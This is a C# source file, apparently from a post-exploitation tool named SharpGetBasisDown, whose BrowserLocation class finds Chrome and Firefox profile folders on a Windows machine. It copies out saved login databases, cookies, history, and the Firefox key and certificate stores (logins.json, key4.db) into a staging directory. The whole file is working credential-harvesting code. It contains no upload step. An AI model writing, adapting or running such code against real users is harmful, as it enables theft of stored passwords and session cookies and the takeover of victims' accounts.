using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.IO;

namespace SharpGetBasisDown
{
    class BrowserLocation
    {
        public static string CreateBrowserDirectory(string browsername)
        {
            string DirectoryName = Program.CreateDirectory() + browsername;
            if (!Directory.Exists(DirectoryName))
            {
                Directory.CreateDirectory(DirectoryName);
            }
            return DirectoryName;
        }
        public static void ChromeLocation()
        {
            string localAppData = Environment.GetEnvironmentVariable("USERPROFILE");
            string ChromeBasePath = String.Format("{0}\\AppData\\Local\\Google\\Chrome", localAppData);

            if (Directory.Exists(ChromeBasePath))
            {
                string ChromeHistoryPath = String.Format("{0}\\User Data\\Default\\History", ChromeBasePath);
                string ChromeBookmarkPath = String.Format("{0}\\User Data\\Default\\Bookmarks", ChromeBasePath);
                string ChromeCookiesPath = String.Format("{0}\\User Data\\Default\\Cookies", ChromeBasePath);
                string ChromeLoginDataPath = String.Format("{0}\\User Data\\Default\\Login Data", ChromeBasePath);
                string[] ChromePaths = { ChromeHistoryPath, ChromeBookmarkPath, ChromeCookiesPath, ChromeLoginDataPath };
                string FilePath = CreateBrowserDirectory("\\Chrome");
                foreach (string filePath in ChromePaths)
                {
                    if (File.Exists(filePath))
                    {
                        var FileName = filePath.Substring(filePath.LastIndexOf('\\'));
                        File.Copy(filePath, FilePath + FileName);
                    }
                }
            }
            else
            {
                Console.WriteLine("  [>] Not Chrome Directory");
            }
        }
        public static void FroefoxLocation()
        {
            string localAppData = Environment.GetEnvironmentVariable("USERPROFILE");
            string FirefoxBasePath = String.Format("{0}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\", localAppData);
            if (Directory.Exists(FirefoxBasePath))
            {
                string[] directories = Directory.GetDirectories(FirefoxBasePath);
                foreach (string directory in directories)
                {
                    string FirefoxPlaces = string.Format("{0}\\{1}", directory, "places.sqlite");
                    string FirefoxCer_1 = String.Format("{0}\\{1}", directory, "cert8.db");
                    string FirefoxCer_2 = String.Format("{0}\\{1}", directory, "cert9.db");
                    string FirefoxKey_1 = String.Format("{0}\\{1}", directory, "key3.db");
                    string FirefoxKey_2 = String.Format("{0}\\{1}", directory, "key4.db");
                    string FirefoxLogon = String.Format("{0}\\{1}", directory, "logins.json");
                    string[] FirefoxPaths = { FirefoxPlaces, FirefoxCer_1, FirefoxCer_2, FirefoxKey_1, FirefoxKey_2, FirefoxLogon };
                    string FilePath = CreateBrowserDirectory("\\Friefox");
                    foreach (string filePath in FirefoxPaths)
                    {
                        if (File.Exists(filePath))
                        {
                            var FileName = filePath.Substring(filePath.LastIndexOf('\\'));
                            File.Copy(filePath, FilePath + FileName);
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("  [>] Not Friefox Directory");
            }
        }
    }
}
